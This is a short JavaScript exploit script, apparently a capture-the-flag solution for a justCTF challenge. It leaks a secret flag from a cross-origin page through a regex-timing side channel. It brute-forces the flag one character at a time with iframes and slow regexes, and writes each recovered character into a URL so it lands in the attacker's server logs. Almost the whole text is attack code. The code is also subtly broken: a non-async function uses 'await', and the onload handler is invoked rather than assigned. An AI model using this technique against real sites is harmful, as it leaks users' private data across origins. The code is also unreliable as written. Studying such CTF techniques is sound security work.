// Challenge server
const url = "https://computeration-fixed.web.jctf.pro/#"
// sleep time between brute forces
const t_sleep = 50
// delta between triggering the regex and loading the second iframe
const delta = 20
// sleep function
const sleep = d => new Promise(r=>setTimeout(r,d));
// flag alphabet (including closing brace)
const alphabet = "abcdefghijklmnopqrstuvwxyz-_}"
// Regex threshold for timing attack
const threshold = 20;

// Read the known part of the flag from the url (in case we want to resume a partial attempt)
var known = window.location.search.slice(1);
// Create an initial iframe that will perform page loads
var ifr = document.createElement('iframe');
ifr.src = url;
document.body.appendChild(ifr);

function testChar(c) {
  // Measure the initial time
  var start = performance.now();

  // Perform a slow regex search in the iframe
  // The number of ".*"'s goes up as we learn more of the flag, to keep the
  // regex sufficiently difficult.
  var dif = 6 + Math.floor(Math.log(known.length) / 2);
  var regex = "^(?="+known+c+")"+ ".*".repeat(dif) +"PreventRegexEngineFromExitingEarly$";
  ifr.src = url+encodeURIComponent(regex);
  // Sleep for a few ms, to ensure the regex engine is churning when we load the second iframe
  await sleep(delta);

  // Setup a measurement
  var ifr2 = document.createElement('iframe');
  ifr2.src = url;
  ifr2.onload = measure(start, c);
  document.body.appendChild(ifr2);
}

async function measure(start, c) {
  var time = performance.now() - start - delta;
  console.log("[%s: %d ms] %s", c, time, known);


  // This took longer than usual, indicating regex-bullshittery
  if (time > threshold) {
    // Update the "known" variable with the new character
    known = known + c;
    // Add the current flag to the url so we can see it in our server logs
    window.location = window.location.origin + window.location.pathname + "?" + known;
  }
}

async function bruteForce() {
  // Keep looping until we reach the closing brace
  while (known[known.length-1] != "}"){
    for (c of alphabet) {
      await sleep(t_sleep);
      testChar(c);
    }
  }
}

// entrypoint
if (known == "") {
  known = "justCTF{"
}

bruteForce();
